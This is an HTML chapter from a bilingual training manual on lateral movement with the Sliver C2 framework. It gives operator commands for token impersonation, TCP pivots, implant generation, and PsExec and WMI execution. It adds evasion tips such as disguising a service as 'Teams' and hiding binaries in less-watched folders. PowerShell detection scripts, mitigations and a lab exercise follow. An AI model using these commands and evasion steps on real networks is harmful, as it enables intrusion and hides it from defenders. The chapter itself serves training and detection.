@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 14 — Sliver C2: Lateral Movement | Ch. 14</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent2);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent2)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent2)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.info{border-left-color:var(--accent2);background:rgba(88,166,255,.08)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 14 — Sliver C2: Lateral Movement</h1>
+<div class="sub">Ch. 14 — Sliver: Building C2 During a Cyber War — Part 6</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Avançado / C2</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#tokens">Tokens</a></li><li><a href="#psexec">PsExec Pivot</a></li>
+<li><a href="#wmi">WMI Pivot</a></li><li><a href="#impacket">Métodos Impacket</a></li>
+<li><a href="#opsec">OPSEC e Evasão</a></li><li><a href="#impact">Scripts de Impacto</a></li>
+<li><a href="#mitre">MITRE</a></li><li><a href="#mitig">Mitigações</a></li>
+<li><a href="#lab">Laboratório</a></li><li><a href="#revq">Revisão</a></li>
+<li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender o papel do movimento lateral em AD; usar <code class="inline">make-token</code> para impersonação de rede; configurar <code class="inline">pivots tcp</code> para alcançar redes internas; gerar implantes <code class="inline">--format service</code>; executar PsExec Pivot e WMI Pivot via Sliver; conhecer os métodos Impacket alternativos; aplicar OPSEC (nomes de serviço credíveis, FQDNs); <strong>construir scripts de impacto nativos</strong> para deteção.</span>
+<span class="en">Understand the role of lateral movement in AD; use <code class="inline">make-token</code> for network impersonation; configure <code class="inline">pivots tcp</code> to reach internal networks; generate <code class="inline">--format service</code> implants; execute PsExec Pivot and WMI Pivot via Sliver; know the alternative Impacket methods; apply OPSEC (believable service names, FQDNs); <strong>build native impact scripts</strong> for detection.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O movimento lateral não é particularmente complicado por si só. A sua eficácia está diretamente ligada à profundidade do reconhecimento que fizeste antes. Quanto mais informado estiveres sobre a estrutura do domínio, mais estrategicamente podes espalhar-te, minimizando o ruído e evitando deteção precoce enquanto alcanças primeiro os sistemas mais valiosos. Começamos com técnicas disponíveis no Sliver C2 e depois passamos para métodos baseados em Impacket. A evasão de deteção também será discutida como parte do contexto operacional.</span>
+<span class="en">Lateral movement is not particularly complicated on its own. Its effectiveness is directly tied to the depth of reconnaissance you performed earlier. The more informed you are about the structure of the domain, the more strategically you can spread, minimizing noise and avoiding early detection while reaching the most valuable systems first. We begin with techniques available in Sliver C2, then move to Impacket-based methods. Detection avoidance will also be discussed as part of the operational context.</span>
+</div>
+</section>
+
+<section id="tokens">
+<h2>3. Tokens — <code class="inline">make-token</code> <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Depois de comprometer uma máquina inicial, o próximo passo comum é a extração de credenciais — seja por dump de hashes ou por Kerberoasting/AS-REP roasting. Eventualmente, obténs credenciais em texto claro. A partir daí, uma forma eficiente de usar essas credenciais é através de <strong>impersonação de token</strong>.</span>
+<span class="en">After compromising an initial machine, the next common step is credential extraction — whether by dumping hashes or leveraging Kerberoasting/AS-REP roasting. Eventually, you end up with plaintext credentials. From there, one efficient way to use these credentials is through <strong>token impersonation</strong>.</span>
+</div>
+<div class="lang">
+<span class="pt">A funcionalidade <code class="inline">make-token</code> do Sliver imita o comportamento das capacidades nativas de gestão de tokens do Windows. Cria uma nova sessão de logon com as credenciais fornecidas, permitindo agir como esse utilizador <strong>sobre a rede</strong>, mantendo a tua sessão original intacta localmente. Este modelo de identidade dupla é útil quando queres interagir com sistemas como um utilizador privilegiado sem mudar completamente de contexto.</span>
+<span class="en">Sliver's <code class="inline">make-token</code> feature mimics the behavior of Windows' built-in token management capabilities. It creates a new logon session with the provided credentials, allowing you to act as that user <strong>over the network</strong>, while keeping your original session intact locally. This dual identity model is useful when you want to interact with systems as a privileged user without fully switching contexts.</span>
+</div>
+<h3>3.1 Sintaxe / Syntax</h3>
+<pre>sliver (session) > make-token -u admin -p password -d domain.ru</pre>
+<h3>3.2 Testar acesso / Test access</h3>
+<pre>sliver (session) > ls //DC.DOMAIN.RU/c$</pre>
+<div class="lang">
+<span class="pt">Se listar ficheiros no domain controller funcionar, é provável que estejas autorizado a lê-los também. Uploads e downloads de ficheiros tornam-se possíveis nesta fase. Um truque: fazer upload de um atalho que aponta para um caminho de rede inexistente pode forçar o Windows a autenticar no teu listener se estiveres a correr o Responder — capturando hashes NTLMv2 para cracking offline.</span>
+<span class="en">If listing files on the domain controller works, you are likely authorized to read them as well. File uploads and downloads also become possible at this stage. One trick: uploading a shortcut that links to a nonexistent network path can force Windows to authenticate to your listener if you're running Responder — capturing NTLMv2 hashes for offline cracking.</span>
+</div>
+<div class="callout info">
+<strong>Nota / Note:</strong>
+<div class="lang">
+<span class="pt">Usa <strong>FQDNs</strong> (nomes de domínio totalmente qualificados) sempre que possível — são mais fiáveis e esperados por muitas ferramentas por omissão.</span>
+<span class="en">Use <strong>FQDNs</strong> (fully qualified domain names) wherever possible — they are more reliable and expected by many tools by default.</span>
+</div>
+</div>
+<h3>3.3 Logon Types <span class="badge comp">Complementar</span></h3>
+<div class="lang">
+<span class="pt">O <code class="inline">make-token</code> suporta diferentes tipos de logon. O mais relevante para movimento lateral é <code class="inline">LOGON_NEW_CREDENTIALS</code> (por omissão), que clona o token atual e usa as novas credenciais para conexões de saída.</span>
+<span class="en"><code class="inline">make-token</code> supports different logon types. The most relevant for lateral movement is <code class="inline">LOGON_NEW_CREDENTIALS</code> (default), which clones the current token and uses the new credentials for outbound connections.</span>
+</div>
+<table>
+<tr><th>Logon Type</th><th>Uso / Use</th></tr>
+<tr><td><code class="inline">LOGON_NEW_CREDENTIALS</code></td><td>Auth de saída (psexec, SMB) — predefinido / Outbound auth (default)</td></tr>
+<tr><td><code class="inline">LOGON_NETWORK</code></td><td>Servidor de alto desempenho / High-performance server</td></tr>
+<tr><td><code class="inline">LOGON_BATCH</code></td><td>Scheduled tasks / startup</td></tr>
+<tr><td><code class="inline">LOGON_INTERACTIVE</code></td><td>Console / RDP</td></tr>
+</table>
+</section>
+
+<section id="psexec">
+<h2>4. PsExec Pivot <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Para estender o alcance do C2 na rede interna, precisas de estabelecer novas sessões ativas. É aqui que entra o <strong>pivoting</strong>. O pivoting permite aceder a máquinas que não estão diretamente ligadas à internet usando uma que já comprometeste como ponto de relay.</span>
+<span class="en">To extend your C2 reach within the internal network, you need to establish new active sessions. This is where <strong>pivoting</strong> comes in. Pivoting allows you to access machines that are not directly connected to the internet by using one you have already compromised as a relay point.</span>
+</div>
+<div class="lang">
+<span class="pt">A ferramenta PsExec do Impacket espelha a utilidade original da Sysinternals. Lança um processo remotamente na máquina alvo e permite interagir com ele. Embora os antivírus modernos tenham aprendido a detetar comportamento PsExec estilo Impacket, a ferramenta ainda oferece vantagens, especialmente a capacidade de autenticar usando um hash NTLM em vez de credenciais em texto claro.</span>
+<span class="en">The PsExec tool in Impacket mirrors Microsoft's original Sysinternals utility. It remotely spawns a process on the target machine and lets you interact with it. While modern antivirus solutions have learned to detect Impacket-style PsExec behavior, the tool still offers advantages, especially the ability to authenticate using an NTLM hash instead of plaintext credentials.</span>
+</div>
+<h3>4.1 Fluxo / Flow</h3>
+<pre># 1. Criar token (se ainda não fizeste)
+sliver (session) > make-token -u admin -p password -d domain.ru
+
+# 2. Iniciar pivot listener no host comprometido (porta 9898 por omissão)
+sliver (session) > pivots tcp --bind 192.168.1.90
+
+# 3. Gerar implante service que liga de volta ao listener
+sliver (session) > generate --format service -i 192.168.1.90:9898 --skip-symbols -N psexec-pivot
+
+# 4. Executar PsExec com nome de serviço credível
+sliver (session) > psexec --custom-exe /root/payloads/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeams target.domain.ru</pre>
+<div class="lang">
+<span class="pt">Se o sistema alvo não estiver protegido por antivírus ou ferramentas de deteção de endpoint, o payload executa com sucesso, dando-te uma shell <strong>SYSTEM</strong>.</span>
+<span class="en">If the target system is unprotected by antivirus or endpoint detection tools, the payload executes successfully, giving you a <strong>SYSTEM</strong>-level shell.</span>
+</div>
+</section>
+
+<section id="wmi">
+<h2>5. WMI Pivot <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O WMI (Windows Management Instrumentation) fornece aos administradores uma forma unificada de gerir máquinas locais e remotas. Da perspetiva de red team, o WMI é também um método nativo de execução remota de código, desde que tenhas direitos de administrador local.</span>
+<span class="en">WMI (Windows Management Instrumentation) provides administrators with a unified way to manage both local and remote machines. From a red team perspective, WMI is also a native method for remote code execution, provided you have local admin rights.</span>
+</div>
+<h3>5.1 Fluxo / Flow</h3>
+<pre># 1. Gerar implante para entrega via WMI (listener ainda ativo)
+sliver (session) > generate -i 192.168.1.90:9898 --skip-symbols -N wmicpivot
+
+# 2. Upload para o alvo (diretório menos inspecionado)
+sliver (session) > cd //target.domain.ru/c$/windows/tasks
+sliver (session) > upload wmicpivot.exe
+
+# 3. Executar via WMI
+sliver (session) > execute -o wmic /node:Target_IP /user:admin /password:password process call create "C:\\windows\\tasks\\wmicpivot.exe"</pre>
+<div class="lang">
+<span class="pt">Se tudo estiver configurado corretamente, isto deve devolver uma sessão de nível SYSTEM através do pivot.</span>
+<span class="en">If everything is configured correctly, this should return a SYSTEM-level session through the pivot.</span>
+</div>
+</section>
+
+<section id="impacket">
+<h2>6. Métodos Impacket <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Se o WMI não estiver disponível, o PsExec continua a ser uma opção sólida, especialmente quando a porta SMB (445) está aberta:</span>
+<span class="en">If WMI is unavailable, PsExec remains a solid option, especially when the SMB port (445) is open:</span>
+</div>
+<pre>c2 > proxychains4 psexec.py domain.ru/admin:password@target</pre>
+<div class="lang">
+<span class="pt">Isto dá-te novamente uma shell de nível SYSTEM, assumindo credenciais adequadas e portas abertas. Recomendamos usar a utilidade original da Microsoft (Sysinternals) para evitar deteção.</span>
+<span class="en">This again yields a SYSTEM-level shell, assuming proper credentials and open ports. We recommend using Microsoft's original Sysinternals utility to avoid detection.</span>
+</div>
+</section>
+
+<section id="opsec">
+<h2>7. OPSEC e Evasão <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">O Sliver PsExec coloca o binário com um nome aleatório em <code class="inline">C:\Windows\Temp</code> (monitorizado). Altera <code class="inline">--service-name</code> e <code class="inline">--service-description</code> para te misturares — o valor por omissão é "Sliver". Não uses o binário de serviço gerado pelo C2 se houver AV — é facilmente sinalizado.</span>
+<span class="en">Sliver PsExec places the binary with a random name in <code class="inline">C:\Windows\Temp</code> (monitored). Change <code class="inline">--service-name</code> and <code class="inline">--service-description</code> to blend in — the default is "Sliver". Don't use the C2-generated service binary if AV is present — it's easily flagged.</span>
+</div>
+<table>
+<tr><th>Boa prática / Best practice</th><th>Porquê / Why</th></tr>
+<tr><td>Usar FQDNs</td><td>Mais fiável, esperado por ferramentas / More reliable, expected by tools</td></tr>
+<tr><td>Nome de serviço credível (ex.: Teams)</td><td>Evita deteção por nome "Sliver" / Avoids "Sliver" name detection</td></tr>
+<tr><td>Descrição credível</td><td>Parece legítimo no Gestor de Serviços / Looks legit in Services Manager</td></tr>
+<tr><td>Upload para <code class="inline">C:\Windows\Tasks</code></td><td>Menos inspecionado que Temp / Less inspected than Temp</td></tr>
+<tr><td>Preferir Sysinternals PsExec</td><td>Menos detetado que Impacket / Less detected than Impacket</td></tr>
+</table>
+</section>
+
+<section id="impact">
+<h2>8. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts abaixo ajudam o blue team a detetar atividade compatível com Sliver Lateral Movement.</span>
+<span class="en">The scripts below help the blue team detect Sliver Lateral Movement-compatible activity.</span>
+</div>
+
+<h3>8.1 Script 14.1 — Deteção de Serviço "Sliver" / Sliver Service Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar criação de serviços com nome "Sliver" ou descrição "Sliver Implant" (evento 7045). <strong>Evidência:</strong> <code class="inline">sliver-service-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect service creation with name "Sliver" or description "Sliver Implant" (event 7045). <strong>Evidence:</strong> <code class="inline">sliver-service-detect.csv</code>.</span>
+</div>
+<pre># Script 14.1 - Sliver Service Detection
+$out = ".\sliver-service-detect.csv"
+$hits = @()
+Get-WinEvent -LogName System -MaxEvents 1000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 7045 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $name = ($xml.Event.EventData.Data | Where-Object Name -eq "ServiceName").'#text'
+    $desc = ($xml.Event.EventData.Data | Where-Object Name -eq "ServiceDescription").'#text'
+    $img  = ($xml.Event.EventData.Data | Where-Object Name -eq "ImagePath").'#text'
+    if ($name -match "Sliver" -or $desc -match "Sliver" -or $img -match "Temp.*\.exe") {
+      $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Service=$name; Description=$desc; Image=$img }
+    }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Sliver service hits: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>8.2 Script 14.2 — Deteção de make-token / Token Impersonation Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar logons de rede (tipo 3) com credenciais explícitas (evento 4648) em sequência rápida — indicador de <code class="inline">make-token</code>. <strong>Evidência:</strong> <code class="inline">token-impersonation.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect network logons (type 3) with explicit credentials (event 4648) in quick succession — <code class="inline">make-token</code> indicator. <strong>Evidence:</strong> <code class="inline">token-impersonation.csv</code>.</span>
+</div>
+<pre># Script 14.2 - Token Impersonation Detection
+$out = ".\token-impersonation.csv"
+$hits = @()
+Get-WinEvent -LogName Security -MaxEvents 2000 -EA SilentlyContinue |
+  Where-Object { $_.Id -eq 4648 } | ForEach-Object {
+    $xml = [xml]$_.ToXml()
+    $user = ($xml.Event.EventData.Data | Where-Object Name -eq "TargetUserName").'#text'
+    $target = ($xml.Event.EventData.Data | Where-Object Name -eq "TargetServerName").'#text'
+    $hits += [PSCustomObject]@{ Time=$_.TimeCreated; Account=$user; Target=$target }
+  }
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Explicit credential logons: $($hits.Count) -> $out" -ForegroundColor Yellow</pre>
+
+<h3>8.3 Script 14.3 — Deteção de Pivot TCP / TCP Pivot Detection</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar conexões de saída na porta 9898 (predefinida do Sliver pivot) e processos que escutam nessa porta. <strong>Evidência:</strong> <code class="inline">pivot-detect.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect outbound connections on port 9898 (Sliver pivot default) and processes listening on that port. <strong>Evidence:</strong> <code class="inline">pivot-detect.csv</code>.</span>
+</div>
+<pre># Script 14.3 - TCP Pivot Detection
+$out = ".\pivot-detect.csv"
+$hits = @()
+# Listening on 9898
+Get-NetTCPConnection -LocalPort 9898 -EA SilentlyContinue | ForEach-Object {
+  $p = Get-Process -Id $_.OwningProcess -EA SilentlyContinue
+  $hits += [PSCustomObject]@{ Type="Listen"; LocalPort=$_.LocalPort; PID=$_.OwningProcess; Process=$p.ProcessName }
+}
+# Outbound to 9898
+Get-NetTCPConnection -RemotePort 9898 -EA SilentlyContinue | ForEach-Object {
+  $p = Get-Process -Id $_.OwningProcess -EA SilentlyContinue
+  $hits += [PSCustomObject]@{ Type="Outbound"; RemoteAddress=$_.RemoteAddress; RemotePort=$_.RemotePort; PID=$_.OwningProcess; Process=$p.ProcessName }
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Pivot connections: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+
+<h3>8.4 Script 14.4 — Deteção de Serviço com Nome Credível mas Binário em Temp / Credible Service Name, Temp Binary</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> detetar serviços com nomes legítimos (Teams, Windows Update) mas cujo binário está em <code class="inline">C:\Windows\Temp</code> ou similar. <strong>Evidência:</strong> <code class="inline">suspicious-services.csv</code>.</span>
+<span class="en"><strong>Goal:</strong> detect services with legitimate names (Teams, Windows Update) but whose binary is in <code class="inline">C:\Windows\Temp</code> or similar. <strong>Evidence:</strong> <code class="inline">suspicious-services.csv</code>.</span>
+</div>
+<pre># Script 14.4 - Credible Service Name with Temp Binary
+$out = ".\suspicious-services.csv"
+$hits = @()
+Get-CimInstance Win32_Service | Where-Object {
+  $_.PathName -match "\\Temp\\" -and $_.Name -notmatch "^(Sliver|Temp)"
+} | ForEach-Object {
+  $hits += [PSCustomObject]@{ Name=$_.Name; DisplayName=$_.DisplayName; Path=$_.PathName; State=$_.State; StartMode=$_.StartMode }
+}
+$hits | Export-Csv $out -NoTypeInformation -Encoding UTF8
+Write-Host "[+] Suspicious services: $($hits.Count) -> $out" -ForegroundColor Red</pre>
+</section>
+
+<section id="mitre">
+<h2>9. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>Remote Services: SMB/Windows Admin Shares</td><td>T1021.002</td><td>PsExec Pivot</td></tr>
+<tr><td>Windows Management Instrumentation</td><td>T1047</td><td>WMI Pivot</td></tr>
+<tr><td>Create or Modify System Process: Windows Service</td><td>T1543.003</td><td>PsExec service creation</td></tr>
+<tr><td>Use Alternate Authentication Material</td><td>T1550</td><td><code class="inline">make-token</code></td></tr>
+<tr><td>Command and Scripting Interpreter</td><td>T1059</td><td>Payload execution</td></tr>
+<tr><td>Non-Standard Port</td><td>T1571</td><td>TCP pivot (9898)</td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>10. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Monitorizar criação de serviços</strong> (evento 7045) — Script 14.1.</li>
+<li><strong>Alertar sobre logons 4648 em sequência</strong> — Script 14.2.</li>
+<li><strong>Monitorizar portas não-standard</strong> (9898) — Script 14.3.</li>
+<li><strong>Alertar sobre serviços com binários em Temp</strong> — Script 14.4.</li>
+<li><strong>Restringir <code class="inline">SeImpersonatePrivilege</code></strong> — limita <code class="inline">make-token</code>.</li>
+<li><strong>Desativar SMB onde possível</strong> — limita PsExec.</li>
+<li><strong>Restringir WMI remoto</strong> — limita WMI Pivot.</li>
+<li><strong>Segmentação de rede</strong> — limita pivoting.</li>
+<li><strong>AppLocker/WDAC</strong> — bloqueia binários não assinados em Temp.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>11. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> Sliver C2 configurado (Kali), VM Windows comprometida (WEB01) e VM Windows alvo (SRV01) na mesma rede host-only. Snapshot antes. <strong>Objetivo:</strong> criar token, configurar pivot, executar PsExec e WMI, correr deteções.</span>
+<span class="en"><strong>Scenario:</strong> Sliver C2 configured (Kali), compromised Windows VM (WEB01) and target Windows VM (SRV01) on the same host-only network. Snapshot before. <strong>Goal:</strong> create token, configure pivot, execute PsExec and WMI, run detections.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>make-token</td><td><code class="inline">make-token -u admin -p pass -d domain.local</code></td><td>Output</td></tr>
+<tr><td>2</td><td>Testar acesso</td><td><code class="inline">ls //SRV01.domain.local/c$</code></td><td>Listagem</td></tr>
+<tr><td>3</td><td>Pivot TCP</td><td><code class="inline">pivots tcp --bind 192.168.1.90</code></td><td>Listener ativo</td></tr>
+<tr><td>4</td><td>Gerar implante</td><td><code class="inline">generate --format service -i 192.168.1.90:9898 -N psexec-pivot</code></td><td>Ficheiro .exe</td></tr>
+<tr><td>5</td><td>PsExec Pivot</td><td><code class="inline">psexec --custom-exe ... --service-name Teams SRV01</code></td><td>Sessão SYSTEM</td></tr>
+<tr><td>6</td><td>WMI Pivot</td><td><code class="inline">generate -i 192.168.1.90:9898 -N wmicpivot</code> + <code class="inline">execute -o wmic ...</code></td><td>Sessão SYSTEM</td></tr>
+<tr><td>7</td><td>Deteção serviços</td><td><code class="inline">.\sliver-service-detect.ps1</code></td><td><code class="inline">sliver-service-detect.csv</code></td></tr>
+<tr><td>8</td><td>Deteção token</td><td><code class="inline">.\token-impersonation.ps1</code></td><td><code class="inline">token-impersonation.csv</code></td></tr>
+<tr><td>9</td><td>Deteção pivot</td><td><code class="inline">.\pivot-detect.ps1</code></td><td><code class="inline">pivot-detect.csv</code></td></tr>
+<tr><td>10</td><td>Deteção serviços suspeitos</td><td><code class="inline">.\suspicious-services.ps1</code></td><td><code class="inline">suspicious-services.csv</code></td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li>Output de <code class="inline">make-token</code></li>
+<li>Pivot listener ativo</li>
+<li>Sessão SYSTEM via PsExec/WMI</li>
+<li><code class="inline">sliver-service-detect.csv</code></li>
+<li><code class="inline">token-impersonation.csv</code></li>
+<li><code class="inline">pivot-detect.csv</code></li>
+<li><code class="inline">suspicious-services.csv</code></li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>12. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Qual é a diferença entre <code class="inline">make-token</code> e <code class="inline">migrate</code>? / What's the difference between <code class="inline">make-token</code> and <code class="inline">migrate</code>?</li>
+<li>Porque é que o <code class="inline">LOGON_NEW_CREDENTIALS</code> é o tipo predefinido para movimento lateral? / Why is <code class="inline">LOGON_NEW_CREDENTIALS</code> the default for lateral movement?</li>
+<li>O que faz o <code class="inline">pivots tcp</code> e em que porta corre por omissão? / What does <code class="inline">pivots tcp</code> do and which port does it use by default?</li>
+<li>Porque é que se deve mudar o <code class="inline">--service-name</code>? / Why change <code class="inline">--service-name</code>?</li>
+<li>Qual a diferença entre PsExec Pivot e WMI Pivot? / What's the difference between PsExec Pivot and WMI Pivot?</li>
+<li>Como se deteta um serviço Sliver no blue team? / How to detect a Sliver service on the blue team?</li>
+<li>Porque é que a segmentação de rede mitiga o pivoting? / Why does network segmentation mitigate pivoting?</li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>13. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo cobriu o movimento lateral com Sliver C2: <code class="inline">make-token</code> para impersonação de rede (LOGON_NEW_CREDENTIALS), <code class="inline">pivots tcp</code> para alcançar redes internas (porta 9898), geração de implantes <code class="inline">--format service</code>, PsExec Pivot (serviço SYSTEM) e WMI Pivot (execução nativa). A OPSEC é crítica: usar FQDNs, nomes de serviço credíveis (Teams em vez de Sliver), e uploads para diretórios menos inspecionados. Os métodos Impacket (psexec.py via proxychains) são alternativas quando o Sliver não está disponível. Acrescentámos <strong>quatro scripts de impacto</strong> (deteção de serviço Sliver, impersonação de token, pivot TCP, serviços suspeitos) que ajudam o blue team a detetar esta técnica. O Cap. 15 entra no PowerSploit.</span>
+<span class="en">This chapter covered lateral movement with Sliver C2: <code class="inline">make-token</code> for network impersonation (LOGON_NEW_CREDENTIALS), <code class="inline">pivots tcp</code> to reach internal networks (port 9898), <code class="inline">--format service</code> implant generation, PsExec Pivot (SYSTEM service), and WMI Pivot (native execution). OPSEC is critical: use FQDNs, believable service names (Teams instead of Sliver), and uploads to less-inspected directories. Impacket methods (psexec.py via proxychains) are alternatives when Sliver isn't available. We added <strong>four impact scripts</strong> (Sliver service detection, token impersonation, TCP pivot, suspicious services) that help the blue team detect this technique. Ch. 15 moves into PowerSploit.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 14 / Ethical Hacker Training Manual — Ch. 14</div>
+<div style="margin-top:.6rem">
+<a href="cap13.html">← Cap. anterior / Previous</a> &nbsp;|&nbsp;
+<a href="#">Índice / Index</a> &nbsp;|&nbsp;
+<a href="cap15.html">Cap. seguinte / Next →</a>
+</div>
+</footer>
+</body>
+</html>
